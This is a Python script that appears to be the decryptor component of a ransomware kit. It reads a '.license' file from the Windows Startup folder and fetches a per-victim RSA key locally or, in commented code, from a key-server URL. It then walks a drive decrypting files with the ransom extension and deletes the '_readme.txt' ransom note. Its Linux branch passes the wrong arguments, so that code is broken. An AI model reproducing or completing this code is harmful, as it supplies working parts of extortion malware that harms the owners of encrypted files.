import os
import requests as req
from sys import platform
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP

def sp():
    if(platform == 'win32'):
        return '\\'
    elif(platform == 'linux'):
        return '/'

def gext(filename):
    with open(filename,'r') as license:
        ler = license.read()
    ext = '.' + ler.split('.')[1]
    return ext

def gl(filename):
    try:
        # On Website
        # url_web = "YOUR URL"
        # with open(filename,'r') as license:
        #     ler = license.read()
        #     l = ler.split('.')[0]
        # URL_KEY = url_web + l + '.pem'
        # pvk = req.get(URL_KEY).text
        # return pvk
    
        # On Local (Tested)
        url_web = "priv/"
        with open(filename,'r') as license:
            ler = license.read()
            l = ler.split('.')[0]
        URL_KEY = url_web + l + '.pem'
        priv = open(URL_KEY).read()
        return priv
    except:
        print("Please use internet connection")

def decrypt(filename,pvk):
    with open(filename, "rb") as file:
        private_key = RSA.import_key(pvk)
        enc_session_key, nonce, tag, ciphertext = [ file.read(x) for x in (private_key.size_in_bytes(), 16, 16, -1) ]
        # Decrypt the session key with the private RSA key
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)
        # Decrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)

    with open(filename, "wb") as file:
        file.write(data)


def defense(target,ext,pvk):
    for p, d, f in os.walk(target):
        for name in f:
            if name.endswith((ext)):
                try:
                    decrypt(os.path.join(p, name),pvk)
                    newFile = os.path.splitext(name)[0]
                    os.rename(os.path.join(p, name), os.path.join(p,newFile))
                except:
                    continue

if __name__ == '__main__':
    if (platform == 'win32'):
        t = ['I:']
        jlog = os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        ext = gext(jlog+sp()+'.license')
        pvk = gl(jlog+sp()+'.license')

        for i in range(len(t)):
            defense(t[i] + sp(),ext,pvk)
            try:
                os.remove(jlog+sp()+"_readme.txt")
            except:
                status = "All Files has been Decrypted"
    elif (platform == 'linux'):
        t = [os.environ["HOME"]]
        for i in range(len(t)):
            defense(t[i] + sp(),t[i])
    else:
        print('I will better')